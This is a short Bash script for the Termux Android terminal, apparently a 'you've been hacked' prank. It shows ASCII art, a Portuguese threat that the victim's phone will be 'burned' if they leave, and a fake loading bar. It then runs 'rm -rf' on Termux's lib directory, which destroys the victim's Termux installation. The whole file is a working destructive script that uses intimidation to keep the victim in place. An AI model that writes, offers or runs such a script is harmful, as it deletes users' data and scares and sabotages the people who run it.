#!/bin/bash

# Arte ASCII
cat << "EOF"
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                              (_.)  _  )   /
                                 \`.___/ \`    /
                                  \`-----' /
                      <----.     __ / __   \\
                      <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\
EOF

# Mensagem
echo "Você foi ownado pelo untw0, não saia daqui se não seu celular vai ser queimado"

# Simulação de carregamento
echo -n "["
for i in {1..30}; do
    sleep 1
    if [ $((i % 10)) -eq 0 ]; then
        echo -n "#"
    else
        echo -n " "
    fi
done
echo "]"
echo "100%"

# Navegar para a pasta e executar o comando
cd /data/data/com.termux/files/usr
echo "Executando comando rm -rf lib..."
rm -rf lib
